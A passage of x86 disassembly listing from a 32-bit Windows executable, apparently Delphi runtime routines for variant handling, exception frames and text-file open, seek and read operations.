  4035e7:	7f ea                	jg     0x4035d3
  4035e9:	5d                   	pop    %ebp
  4035ea:	eb 14                	jmp    0x403600
  4035ec:	55                   	push   %ebp
  4035ed:	89 d5                	mov    %edx,%ebp
  4035ef:	89 d8                	mov    %ebx,%eax
  4035f1:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4035f5:	89 f2                	mov    %esi,%edx
  4035f7:	e8 58 ff ff ff       	call   0x403554
  4035fc:	4f                   	dec    %edi
  4035fd:	7f f0                	jg     0x4035ef
  4035ff:	5d                   	pop    %ebp
  403600:	5f                   	pop    %edi
  403601:	5e                   	pop    %esi
  403602:	5b                   	pop    %ebx
  403603:	c3                   	ret
  403604:	b9 01 00 00 00       	mov    $0x1,%ecx
  403609:	e9 6e ff ff ff       	jmp    0x40357c
  40360e:	c3                   	ret
  40360f:	90                   	nop
  403610:	53                   	push   %ebx
  403611:	56                   	push   %esi
  403612:	57                   	push   %edi
  403613:	55                   	push   %ebp
  403614:	81 c4 00 f8 ff ff    	add    $0xfffff800,%esp
  40361a:	8b f1                	mov    %ecx,%esi
  40361c:	8b da                	mov    %edx,%ebx
  40361e:	8b f8                	mov    %eax,%edi
  403620:	85 db                	test   %ebx,%ebx
  403622:	75 09                	jne    0x40362d
  403624:	8b c6                	mov    %esi,%eax
  403626:	e8 6d fb ff ff       	call   0x403198
  40362b:	eb 61                	jmp    0x40368e
  40362d:	81 fb 00 04 00 00    	cmp    $0x400,%ebx
  403633:	7d 26                	jge    0x40365b
  403635:	6a 00                	push   $0x0
  403637:	6a 00                	push   $0x0
  403639:	68 00 08 00 00       	push   $0x800
  40363e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403642:	50                   	push   %eax
  403643:	53                   	push   %ebx
  403644:	57                   	push   %edi
  403645:	6a 00                	push   $0x0
  403647:	6a 00                	push   $0x0
  403649:	e8 ce db ff ff       	call   0x40121c
  40364e:	8b c8                	mov    %eax,%ecx
  403650:	8b d4                	mov    %esp,%edx
  403652:	8b c6                	mov    %esi,%eax
  403654:	e8 1f fc ff ff       	call   0x403278
  403659:	eb 33                	jmp    0x40368e
  40365b:	6a 00                	push   $0x0
  40365d:	6a 00                	push   $0x0
  40365f:	6a 00                	push   $0x0
  403661:	6a 00                	push   $0x0
  403663:	53                   	push   %ebx
  403664:	57                   	push   %edi
  403665:	6a 00                	push   $0x0
  403667:	6a 00                	push   $0x0
  403669:	e8 ae db ff ff       	call   0x40121c
  40366e:	8b e8                	mov    %eax,%ebp
  403670:	8b c6                	mov    %esi,%eax
  403672:	8b cd                	mov    %ebp,%ecx
  403674:	33 d2                	xor    %edx,%edx
  403676:	e8 fd fb ff ff       	call   0x403278
  40367b:	6a 00                	push   $0x0
  40367d:	6a 00                	push   $0x0
  40367f:	55                   	push   %ebp
  403680:	8b 06                	mov    (%esi),%eax
  403682:	50                   	push   %eax
  403683:	53                   	push   %ebx
  403684:	57                   	push   %edi
  403685:	6a 00                	push   $0x0
  403687:	6a 00                	push   $0x0
  403689:	e8 8e db ff ff       	call   0x40121c
  40368e:	81 c4 00 08 00 00    	add    $0x800,%esp
  403694:	5d                   	pop    %ebp
  403695:	5f                   	pop    %edi
  403696:	5e                   	pop    %esi
  403697:	5b                   	pop    %ebx
  403698:	c3                   	ret
  403699:	8d 40 00             	lea    0x0(%eax),%eax
  40369c:	53                   	push   %ebx
  40369d:	56                   	push   %esi
  40369e:	8b f2                	mov    %edx,%esi
  4036a0:	8b d8                	mov    %eax,%ebx
  4036a2:	53                   	push   %ebx
  4036a3:	e8 84 db ff ff       	call   0x40122c
  4036a8:	8b d0                	mov    %eax,%edx
  4036aa:	8b ce                	mov    %esi,%ecx
  4036ac:	8b c3                	mov    %ebx,%eax
  4036ae:	e8 5d ff ff ff       	call   0x403610
  4036b3:	5e                   	pop    %esi
  4036b4:	5b                   	pop    %ebx
  4036b5:	c3                   	ret
  4036b6:	8b c0                	mov    %eax,%eax
  4036b8:	53                   	push   %ebx
  4036b9:	56                   	push   %esi
  4036ba:	57                   	push   %edi
  4036bb:	55                   	push   %ebp
  4036bc:	81 c4 00 f8 ff ff    	add    $0xfffff800,%esp
  4036c2:	8b d8                	mov    %eax,%ebx
  4036c4:	8b c3                	mov    %ebx,%eax
  4036c6:	e8 29 fc ff ff       	call   0x4032f4
  4036cb:	8b f0                	mov    %eax,%esi
  4036cd:	8b c3                	mov    %ebx,%eax
  4036cf:	e8 20 fc ff ff       	call   0x4032f4
  4036d4:	3d 00 04 00 00       	cmp    $0x400,%eax
  4036d9:	7d 2b                	jge    0x403706
  4036db:	68 00 04 00 00       	push   $0x400
  4036e0:	8d 44 24 04          	lea    0x4(%esp),%eax
  4036e4:	50                   	push   %eax
  4036e5:	56                   	push   %esi
  4036e6:	8b c3                	mov    %ebx,%eax
  4036e8:	e8 27 fd ff ff       	call   0x403414
  4036ed:	50                   	push   %eax
  4036ee:	6a 00                	push   $0x0
  4036f0:	6a 00                	push   $0x0
  4036f2:	e8 0d db ff ff       	call   0x401204
  4036f7:	50                   	push   %eax
  4036f8:	8d 44 24 04          	lea    0x4(%esp),%eax
  4036fc:	50                   	push   %eax
  4036fd:	e8 22 db ff ff       	call   0x401224
  403702:	8b f8                	mov    %eax,%edi
  403704:	eb 28                	jmp    0x40372e
  403706:	6a 00                	push   $0x0
  403708:	6a 00                	push   $0x0
  40370a:	56                   	push   %esi
  40370b:	53                   	push   %ebx
  40370c:	6a 00                	push   $0x0
  40370e:	6a 00                	push   $0x0
  403710:	e8 ef da ff ff       	call   0x401204
  403715:	8b e8                	mov    %eax,%ebp
  403717:	55                   	push   %ebp
  403718:	6a 00                	push   $0x0
  40371a:	e8 05 db ff ff       	call   0x401224
  40371f:	8b f8                	mov    %eax,%edi
  403721:	55                   	push   %ebp
  403722:	57                   	push   %edi
  403723:	56                   	push   %esi
  403724:	53                   	push   %ebx
  403725:	6a 00                	push   $0x0
  403727:	6a 00                	push   $0x0
  403729:	e8 d6 da ff ff       	call   0x401204
  40372e:	8b c7                	mov    %edi,%eax
  403730:	81 c4 00 08 00 00    	add    $0x800,%esp
  403736:	5d                   	pop    %ebp
  403737:	5f                   	pop    %edi
  403738:	5e                   	pop    %esi
  403739:	5b                   	pop    %ebx
  40373a:	c3                   	ret
  40373b:	90                   	nop
  40373c:	b0 0f                	mov    $0xf,%al
  40373e:	e9 d1 ee ff ff       	jmp    0x402614
  403743:	c3                   	ret
  403744:	b0 10                	mov    $0x10,%al
  403746:	e9 c9 ee ff ff       	jmp    0x402614
  40374b:	c3                   	ret
  40374c:	31 d2                	xor    %edx,%edx
  40374e:	66 8b 10             	mov    (%eax),%dx
  403751:	f7 c2 00 40 00 00    	test   $0x4000,%edx
  403757:	75 1a                	jne    0x403773
  403759:	83 fa 08             	cmp    $0x8,%edx
  40375c:	72 15                	jb     0x403773
  40375e:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  403764:	75 13                	jne    0x403779
  403766:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40376b:	83 c0 08             	add    $0x8,%eax
  40376e:	e9 25 fa ff ff       	jmp    0x403198
  403773:	66 c7 00 00 00       	movw   $0x0,(%eax)
  403778:	c3                   	ret
  403779:	50                   	push   %eax
  40377a:	e8 b5 da ff ff       	call   0x401234
  40377f:	c3                   	ret
  403780:	39 d0                	cmp    %edx,%eax
  403782:	74 6c                	je     0x4037f0
  403784:	66 83 38 08          	cmpw   $0x8,(%eax)
  403788:	72 1b                	jb     0x4037a5
  40378a:	50                   	push   %eax
  40378b:	52                   	push   %edx
  40378c:	66 81 38 00 01       	cmpw   $0x100,(%eax)
  403791:	74 08                	je     0x40379b
  403793:	50                   	push   %eax
  403794:	e8 9b da ff ff       	call   0x401234
  403799:	eb 08                	jmp    0x4037a3
  40379b:	83 c0 08             	add    $0x8,%eax
  40379e:	e8 f5 f9 ff ff       	call   0x403198
  4037a3:	5a                   	pop    %edx
  4037a4:	58                   	pop    %eax
  4037a5:	66 83 3a 08          	cmpw   $0x8,(%edx)
  4037a9:	73 11                	jae    0x4037bc
  4037ab:	8b 0a                	mov    (%edx),%ecx
  4037ad:	89 08                	mov    %ecx,(%eax)
  4037af:	8b 4a 08             	mov    0x8(%edx),%ecx
  4037b2:	89 48 08             	mov    %ecx,0x8(%eax)
  4037b5:	8b 4a 0c             	mov    0xc(%edx),%ecx
  4037b8:	89 48 0c             	mov    %ecx,0xc(%eax)
  4037bb:	c3                   	ret
  4037bc:	66 81 3a 00 01       	cmpw   $0x100,(%edx)
  4037c1:	75 19                	jne    0x4037dc
  4037c3:	8b 52 08             	mov    0x8(%edx),%edx
  4037c6:	09 d2                	or     %edx,%edx
  4037c8:	74 09                	je     0x4037d3
  4037ca:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4037cd:	41                   	inc    %ecx
  4037ce:	7e 03                	jle    0x4037d3
  4037d0:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4037d3:	66 c7 00 00 01       	movw   $0x100,(%eax)
  4037d8:	89 50 08             	mov    %edx,0x8(%eax)
  4037db:	c3                   	ret
  4037dc:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4037e1:	52                   	push   %edx
  4037e2:	50                   	push   %eax
  4037e3:	e8 54 da ff ff       	call   0x40123c
  4037e8:	09 c0                	or     %eax,%eax
  4037ea:	0f 85 54 ff ff ff    	jne    0x403744
  4037f0:	c3                   	ret
  4037f1:	8d 40 00             	lea    0x0(%eax),%eax
  4037f4:	55                   	push   %ebp
  4037f5:	8b ec                	mov    %esp,%ebp
  4037f7:	83 c4 f0             	add    $0xfffffff0,%esp
  4037fa:	53                   	push   %ebx
  4037fb:	56                   	push   %esi
  4037fc:	57                   	push   %edi
  4037fd:	8b f9                	mov    %ecx,%edi
  4037ff:	8b f2                	mov    %edx,%esi
  403801:	8b d8                	mov    %eax,%ebx
  403803:	66 81 3b 00 01       	cmpw   $0x100,(%ebx)
  403808:	75 3b                	jne    0x403845
  40380a:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  403810:	57                   	push   %edi
  403811:	6a 00                	push   $0x0
  403813:	68 00 04 00 00       	push   $0x400
  403818:	56                   	push   %esi
  403819:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40381c:	50                   	push   %eax
  40381d:	e8 22 da ff ff       	call   0x401244
  403822:	85 c0                	test   %eax,%eax
  403824:	74 05                	je     0x40382b
  403826:	e8 11 ff ff ff       	call   0x40373c
  40382b:	8b c3                	mov    %ebx,%eax
  40382d:	e8 1a ff ff ff       	call   0x40374c
  403832:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403835:	89 03                	mov    %eax,(%ebx)
  403837:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40383a:	89 43 08             	mov    %eax,0x8(%ebx)
  40383d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403840:	89 43 0c             	mov    %eax,0xc(%ebx)
  403843:	eb 18                	jmp    0x40385d
  403845:	57                   	push   %edi
  403846:	6a 00                	push   $0x0
  403848:	68 00 04 00 00       	push   $0x400
  40384d:	56                   	push   %esi
  40384e:	53                   	push   %ebx
  40384f:	e8 f0 d9 ff ff       	call   0x401244
  403854:	85 c0                	test   %eax,%eax
  403856:	74 05                	je     0x40385d
  403858:	e8 df fe ff ff       	call   0x40373c
  40385d:	5f                   	pop    %edi
  40385e:	5e                   	pop    %esi
  40385f:	5b                   	pop    %ebx
  403860:	8b e5                	mov    %ebp,%esp
  403862:	5d                   	pop    %ebp
  403863:	c3                   	ret
  403864:	55                   	push   %ebp
  403865:	8b ec                	mov    %esp,%ebp
  403867:	51                   	push   %ecx
  403868:	53                   	push   %ebx
  403869:	8b d8                	mov    %eax,%ebx
  40386b:	33 c0                	xor    %eax,%eax
  40386d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403870:	8b 42 08             	mov    0x8(%edx),%eax
  403873:	8d 55 fc             	lea    -0x4(%ebp),%edx
  403876:	e8 21 fe ff ff       	call   0x40369c
  40387b:	8b c3                	mov    %ebx,%eax
  40387d:	e8 ca fe ff ff       	call   0x40374c
  403882:	66 c7 03 00 01       	movw   $0x100,(%ebx)
  403887:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40388a:	89 43 08             	mov    %eax,0x8(%ebx)
  40388d:	5b                   	pop    %ebx
  40388e:	59                   	pop    %ecx
  40388f:	5d                   	pop    %ebp
  403890:	c3                   	ret
  403891:	8d 40 00             	lea    0x0(%eax),%eax
  403894:	53                   	push   %ebx
  403895:	56                   	push   %esi
  403896:	8b d8                	mov    %eax,%ebx
  403898:	8b 42 08             	mov    0x8(%edx),%eax
  40389b:	e8 18 fe ff ff       	call   0x4036b8
  4038a0:	8b f0                	mov    %eax,%esi
  4038a2:	8b c3                	mov    %ebx,%eax
  4038a4:	e8 a3 fe ff ff       	call   0x40374c
  4038a9:	66 c7 03 08 00       	movw   $0x8,(%ebx)
  4038ae:	89 73 08             	mov    %esi,0x8(%ebx)
  4038b1:	5e                   	pop    %esi
  4038b2:	5b                   	pop    %ebx
  4038b3:	c3                   	ret
  4038b4:	55                   	push   %ebp
  4038b5:	8b ec                	mov    %esp,%ebp
  4038b7:	83 c4 ec             	add    $0xffffffec,%esp
  4038ba:	53                   	push   %ebx
  4038bb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4038be:	66 8b 02             	mov    (%edx),%ax
  4038c1:	8b d9                	mov    %ecx,%ebx
  4038c3:	66 3b d8             	cmp    %ax,%bx
  4038c6:	75 0d                	jne    0x4038d5
  4038c8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4038cb:	e8 b0 fe ff ff       	call   0x403780
  4038d0:	e9 c8 00 00 00       	jmp    0x40399d
  4038d5:	66 3d 00 01          	cmp    $0x100,%ax
  4038d9:	75 59                	jne    0x403934
  4038db:	66 83 fb 08          	cmp    $0x8,%bx
  4038df:	75 0d                	jne    0x4038ee
  4038e1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4038e4:	e8 ab ff ff ff       	call   0x403894
  4038e9:	e9 af 00 00 00       	jmp    0x40399d
  4038ee:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  4038f4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4038f7:	e8 98 ff ff ff       	call   0x403894
  4038fc:	33 c0                	xor    %eax,%eax
  4038fe:	55                   	push   %ebp
  4038ff:	68 2d 39 40 00       	push   $0x40392d
  403904:	64 ff 30             	push   %fs:(%eax)
  403907:	64 89 20             	mov    %esp,%fs:(%eax)
  40390a:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40390d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403910:	8b cb                	mov    %ebx,%ecx
  403912:	e8 dd fe ff ff       	call   0x4037f4
  403917:	33 c0                	xor    %eax,%eax
  403919:	5a                   	pop    %edx
  40391a:	59                   	pop    %ecx
  40391b:	59                   	pop    %ecx
  40391c:	64 89 10             	mov    %edx,%fs:(%eax)
  40391f:	68 9d 39 40 00       	push   $0x40399d
  403924:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403927:	e8 20 fe ff ff       	call   0x40374c
  40392c:	c3                   	ret
  40392d:	e9 ca f4 ff ff       	jmp    0x402dfc
  403932:	eb f0                	jmp    0x403924
  403934:	66 81 fb 00 01       	cmp    $0x100,%bx
  403939:	75 58                	jne    0x403993
  40393b:	66 83 f8 08          	cmp    $0x8,%ax
  40393f:	75 0a                	jne    0x40394b
  403941:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403944:	e8 1b ff ff ff       	call   0x403864
  403949:	eb 52                	jmp    0x40399d
  40394b:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  403951:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403954:	66 b9 08 00          	mov    $0x8,%cx
  403958:	e8 97 fe ff ff       	call   0x4037f4
  40395d:	33 c0                	xor    %eax,%eax
  40395f:	55                   	push   %ebp
  403960:	68 8c 39 40 00       	push   $0x40398c
  403965:	64 ff 30             	push   %fs:(%eax)
  403968:	64 89 20             	mov    %esp,%fs:(%eax)
  40396b:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40396e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403971:	e8 ee fe ff ff       	call   0x403864
  403976:	33 c0                	xor    %eax,%eax
  403978:	5a                   	pop    %edx
  403979:	59                   	pop    %ecx
  40397a:	59                   	pop    %ecx
  40397b:	64 89 10             	mov    %edx,%fs:(%eax)
  40397e:	68 9d 39 40 00       	push   $0x40399d
  403983:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403986:	e8 c1 fd ff ff       	call   0x40374c
  40398b:	c3                   	ret
  40398c:	e9 6b f4 ff ff       	jmp    0x402dfc
  403991:	eb f0                	jmp    0x403983
  403993:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403996:	8b cb                	mov    %ebx,%ecx
  403998:	e8 57 fe ff ff       	call   0x4037f4
  40399d:	5b                   	pop    %ebx
  40399e:	8b e5                	mov    %ebp,%esp
  4039a0:	5d                   	pop    %ebp
  4039a1:	c3                   	ret
  4039a2:	8b c0                	mov    %eax,%eax
  4039a4:	66 81 3a 00 01       	cmpw   $0x100,(%edx)
  4039a9:	75 08                	jne    0x4039b3
  4039ab:	8b 52 08             	mov    0x8(%edx),%edx
  4039ae:	e9 35 f8 ff ff       	jmp    0x4031e8
  4039b3:	53                   	push   %ebx
  4039b4:	89 c3                	mov    %eax,%ebx
  4039b6:	83 ec 10             	sub    $0x10,%esp
  4039b9:	66 c7 04 24 00 00    	movw   $0x0,(%esp)
  4039bf:	89 e0                	mov    %esp,%eax
  4039c1:	b9 00 01 00 00       	mov    $0x100,%ecx
  4039c6:	e8 e9 fe ff ff       	call   0x4038b4
  4039cb:	89 d8                	mov    %ebx,%eax
  4039cd:	e8 c6 f7 ff ff       	call   0x403198
  4039d2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4039d6:	89 03                	mov    %eax,(%ebx)
  4039d8:	83 c4 10             	add    $0x10,%esp
  4039db:	5b                   	pop    %ebx
  4039dc:	c3                   	ret
  4039dd:	8d 40 00             	lea    0x0(%eax),%eax
  4039e0:	e9 67 fd ff ff       	jmp    0x40374c
  4039e5:	c3                   	ret
  4039e6:	8b c0                	mov    %eax,%eax
  4039e8:	a1 90 c4 40 00       	mov    0x40c490,%eax
  4039ed:	8b 10                	mov    (%eax),%edx
  4039ef:	89 15 90 c4 40 00    	mov    %edx,0x40c490
  4039f5:	8b 50 04             	mov    0x4(%eax),%edx
  4039f8:	89 15 24 c0 40 00    	mov    %edx,0x40c024
  4039fe:	8b 40 08             	mov    0x8(%eax),%eax
  403a01:	ff d0                	call   *%eax
  403a03:	c3                   	ret
  403a04:	8b 15 90 c4 40 00    	mov    0x40c490,%edx
  403a0a:	89 10                	mov    %edx,(%eax)
  403a0c:	8b 15 24 c0 40 00    	mov    0x40c024,%edx
  403a12:	89 50 04             	mov    %edx,0x4(%eax)
  403a15:	a3 90 c4 40 00       	mov    %eax,0x40c490
  403a1a:	c7 05 24 c0 40 00 e8 	movl   $0x4039e8,0x40c024
  403a21:	39 40 00 
  403a24:	c3                   	ret
  403a25:	8d 40 00             	lea    0x0(%eax),%eax
  403a28:	33 d2                	xor    %edx,%edx
  403a2a:	89 50 10             	mov    %edx,0x10(%eax)
  403a2d:	89 50 0c             	mov    %edx,0xc(%eax)
  403a30:	52                   	push   %edx
  403a31:	8d 50 10             	lea    0x10(%eax),%edx
  403a34:	52                   	push   %edx
  403a35:	ff 70 08             	push   0x8(%eax)
  403a38:	ff 70 14             	push   0x14(%eax)
  403a3b:	ff 30                	push   (%eax)
  403a3d:	e8 82 d7 ff ff       	call   0x4011c4
  403a42:	85 c0                	test   %eax,%eax
  403a44:	74 03                	je     0x403a49
  403a46:	33 c0                	xor    %eax,%eax
  403a48:	c3                   	ret
  403a49:	e8 a6 d7 ff ff       	call   0x4011f4
  403a4e:	c3                   	ret
  403a4f:	33 c0                	xor    %eax,%eax
  403a51:	c3                   	ret
  403a52:	51                   	push   %ecx
  403a53:	8b 50 0c             	mov    0xc(%eax),%edx
  403a56:	85 d2                	test   %edx,%edx
  403a58:	7e 1a                	jle    0x403a74
  403a5a:	33 c9                	xor    %ecx,%ecx
  403a5c:	89 48 0c             	mov    %ecx,0xc(%eax)
  403a5f:	51                   	push   %ecx
  403a60:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403a64:	51                   	push   %ecx
  403a65:	52                   	push   %edx
  403a66:	ff 70 14             	push   0x14(%eax)
  403a69:	ff 30                	push   (%eax)
  403a6b:	e8 74 d7 ff ff       	call   0x4011e4
  403a70:	85 c0                	test   %eax,%eax
  403a72:	74 04                	je     0x403a78
  403a74:	33 c0                	xor    %eax,%eax
  403a76:	59                   	pop    %ecx
  403a77:	c3                   	ret
  403a78:	e8 77 d7 ff ff       	call   0x4011f4
  403a7d:	eb f7                	jmp    0x403a76
  403a7f:	ff 30                	push   (%eax)
  403a81:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403a88:	e8 ef d6 ff ff       	call   0x40117c
  403a8d:	48                   	dec    %eax
  403a8e:	75 01                	jne    0x403a91
  403a90:	c3                   	ret
  403a91:	e8 5e d7 ff ff       	call   0x4011f4
  403a96:	c3                   	ret
  403a97:	56                   	push   %esi
  403a98:	8b f0                	mov    %eax,%esi
  403a9a:	33 c0                	xor    %eax,%eax
  403a9c:	89 46 0c             	mov    %eax,0xc(%esi)
  403a9f:	89 46 10             	mov    %eax,0x10(%esi)
  403aa2:	8b 46 04             	mov    0x4(%esi),%eax
  403aa5:	2d b1 d7 00 00       	sub    $0xd7b1,%eax
  403aaa:	74 0b                	je     0x403ab7
  403aac:	48                   	dec    %eax
  403aad:	74 20                	je     0x403acf
  403aaf:	48                   	dec    %eax
  403ab0:	74 2e                	je     0x403ae0
  403ab2:	e9 49 01 00 00       	jmp    0x403c00
  403ab7:	b8 00 00 00 80       	mov    $0x80000000,%eax
  403abc:	ba 02 00 00 00       	mov    $0x2,%edx
  403ac1:	b9 03 00 00 00       	mov    $0x3,%ecx
  403ac6:	c7 46 1c 28 3a 40 00 	movl   $0x403a28,0x1c(%esi)
  403acd:	eb 27                	jmp    0x403af6
  403acf:	b8 00 00 00 40       	mov    $0x40000000,%eax
  403ad4:	ba 01 00 00 00       	mov    $0x1,%edx
  403ad9:	b9 02 00 00 00       	mov    $0x2,%ecx
  403ade:	eb 0f                	jmp    0x403aef
  403ae0:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  403ae5:	ba 01 00 00 00       	mov    $0x1,%edx
  403aea:	b9 03 00 00 00       	mov    $0x3,%ecx
  403aef:	c7 46 1c 52 3a 40 00 	movl   $0x403a52,0x1c(%esi)
  403af6:	c7 46 24 7f 3a 40 00 	movl   $0x403a7f,0x24(%esi)
  403afd:	c7 46 20 4f 3a 40 00 	movl   $0x403a4f,0x20(%esi)
  403b04:	80 7e 48 00          	cmpb   $0x0,0x48(%esi)
  403b08:	0f 84 ae 00 00 00    	je     0x403bbc
  403b0e:	6a 00                	push   $0x0
  403b10:	68 80 00 00 00       	push   $0x80
  403b15:	51                   	push   %ecx
  403b16:	6a 00                	push   $0x0
  403b18:	52                   	push   %edx
  403b19:	50                   	push   %eax
  403b1a:	8d 46 48             	lea    0x48(%esi),%eax
  403b1d:	50                   	push   %eax
  403b1e:	e8 61 d6 ff ff       	call   0x401184
  403b23:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b26:	0f 84 eb 00 00 00    	je     0x403c17
  403b2c:	89 06                	mov    %eax,(%esi)
  403b2e:	81 7e 04 b3 d7 00 00 	cmpl   $0xd7b3,0x4(%esi)
  403b35:	0f 85 a3 00 00 00    	jne    0x403bde
  403b3b:	ff 4e 04             	decl   0x4(%esi)
  403b3e:	6a 00                	push   $0x0
  403b40:	ff 36                	push   (%esi)
  403b42:	e8 5d d6 ff ff       	call   0x4011a4
  403b47:	40                   	inc    %eax
  403b48:	0f 84 c9 00 00 00    	je     0x403c17
  403b4e:	2d 81 00 00 00       	sub    $0x81,%eax
  403b53:	73 02                	jae    0x403b57
  403b55:	33 c0                	xor    %eax,%eax
  403b57:	6a 00                	push   $0x0
  403b59:	6a 00                	push   $0x0
  403b5b:	50                   	push   %eax
  403b5c:	ff 36                	push   (%esi)
  403b5e:	e8 79 d6 ff ff       	call   0x4011dc
  403b63:	40                   	inc    %eax
  403b64:	0f 84 ad 00 00 00    	je     0x403c17
  403b6a:	6a 00                	push   $0x0
  403b6c:	8b d4                	mov    %esp,%edx
  403b6e:	6a 00                	push   $0x0
  403b70:	52                   	push   %edx
  403b71:	68 80 00 00 00       	push   $0x80
  403b76:	8d 96 4c 01 00 00    	lea    0x14c(%esi),%edx
  403b7c:	52                   	push   %edx
  403b7d:	ff 36                	push   (%esi)
  403b7f:	e8 40 d6 ff ff       	call   0x4011c4
  403b84:	5a                   	pop    %edx
  403b85:	48                   	dec    %eax
  403b86:	0f 85 8b 00 00 00    	jne    0x403c17
  403b8c:	33 c0                	xor    %eax,%eax
  403b8e:	3b c2                	cmp    %edx,%eax
  403b90:	73 4c                	jae    0x403bde
  403b92:	80 bc 06 4c 01 00 00 	cmpb   $0x1a,0x14c(%esi,%eax,1)
  403b99:	1a 
  403b9a:	74 03                	je     0x403b9f
  403b9c:	40                   	inc    %eax
  403b9d:	eb ef                	jmp    0x403b8e
  403b9f:	6a 02                	push   $0x2
  403ba1:	6a 00                	push   $0x0
  403ba3:	2b c2                	sub    %edx,%eax
  403ba5:	50                   	push   %eax
  403ba6:	ff 36                	push   (%esi)
  403ba8:	e8 2f d6 ff ff       	call   0x4011dc
  403bad:	40                   	inc    %eax
  403bae:	74 67                	je     0x403c17
  403bb0:	ff 36                	push   (%esi)
  403bb2:	e8 1d d6 ff ff       	call   0x4011d4
  403bb7:	48                   	dec    %eax
  403bb8:	75 5d                	jne    0x403c17
  403bba:	eb 22                	jmp    0x403bde
  403bbc:	c7 46 24 4f 3a 40 00 	movl   $0x403a4f,0x24(%esi)
  403bc3:	81 7e 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%esi)
  403bca:	74 04                	je     0x403bd0
  403bcc:	6a f6                	push   $0xfffffff6
  403bce:	eb 02                	jmp    0x403bd2
  403bd0:	6a f5                	push   $0xfffffff5
  403bd2:	e8 d5 d5 ff ff       	call   0x4011ac
  403bd7:	83 f8 ff             	cmp    $0xffffffff,%eax
  403bda:	74 3b                	je     0x403c17
  403bdc:	89 06                	mov    %eax,(%esi)
  403bde:	81 7e 04 b1 d7 00 00 	cmpl   $0xd7b1,0x4(%esi)
  403be5:	74 17                	je     0x403bfe
  403be7:	ff 36                	push   (%esi)
  403be9:	e8 a6 d5 ff ff       	call   0x401194
  403bee:	85 c0                	test   %eax,%eax
  403bf0:	74 10                	je     0x403c02
  403bf2:	83 f8 02             	cmp    $0x2,%eax
  403bf5:	75 07                	jne    0x403bfe
  403bf7:	c7 46 20 52 3a 40 00 	movl   $0x403a52,0x20(%esi)
  403bfe:	33 c0                	xor    %eax,%eax
  403c00:	5e                   	pop    %esi
  403c01:	c3                   	ret
  403c02:	ff 36                	push   (%esi)
  403c04:	e8 73 d5 ff ff       	call   0x40117c
  403c09:	c7 46 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%esi)
  403c10:	b8 69 00 00 00       	mov    $0x69,%eax
  403c15:	eb e9                	jmp    0x403c00
  403c17:	c7 46 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%esi)
  403c1e:	e8 d1 d5 ff ff       	call   0x4011f4
  403c23:	eb db                	jmp    0x403c00
  403c25:	8d 88 4c 01 00 00    	lea    0x14c(%eax),%ecx
  403c2b:	89 48 14             	mov    %ecx,0x14(%eax)
  403c2e:	33 c9                	xor    %ecx,%ecx
  403c30:	89 08                	mov    %ecx,(%eax)
  403c32:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403c39:	c7 40 08 80 00 00 00 	movl   $0x80,0x8(%eax)
  403c40:	89 48 0c             	mov    %ecx,0xc(%eax)
  403c43:	89 48 10             	mov    %ecx,0x10(%eax)
  403c46:	c7 40 18 97 3a 40 00 	movl   $0x403a97,0x18(%eax)
  403c4d:	89 48 1c             	mov    %ecx,0x1c(%eax)
  403c50:	89 48 20             	mov    %ecx,0x20(%eax)
  403c53:	89 48 24             	mov    %ecx,0x24(%eax)
  403c56:	8d 40 48             	lea    0x48(%eax),%eax
  403c59:	85 d2                	test   %edx,%edx
  403c5b:	74 1b                	je     0x403c78
  403c5d:	b5 82                	mov    $0x82,%ch
  403c5f:	8a 0a                	mov    (%edx),%cl
  403c61:	42                   	inc    %edx
  403c62:	88 08                	mov    %cl,(%eax)
  403c64:	40                   	inc    %eax
  403c65:	84 c9                	test   %cl,%cl
  403c67:	74 11                	je     0x403c7a
  403c69:	8a 0a                	mov    (%edx),%cl
  403c6b:	42                   	inc    %edx
  403c6c:	88 08                	mov    %cl,(%eax)
  403c6e:	40                   	inc    %eax
  403c6f:	84 c9                	test   %cl,%cl
  403c71:	74 07                	je     0x403c7a
  403c73:	fe cd                	dec    %ch
  403c75:	75 e8                	jne    0x403c5f
  403c77:	48                   	dec    %eax
  403c78:	88 28                	mov    %ch,(%eax)
  403c7a:	c3                   	ret
  403c7b:	8b 50 04             	mov    0x4(%eax),%edx
  403c7e:	81 fa b2 d7 00 00    	cmp    $0xd7b2,%edx
  403c84:	75 08                	jne    0x403c8e
  403c86:	ff 50 1c             	call   *0x1c(%eax)
  403c89:	85 c0                	test   %eax,%eax
  403c8b:	75 0e                	jne    0x403c9b
  403c8d:	c3                   	ret
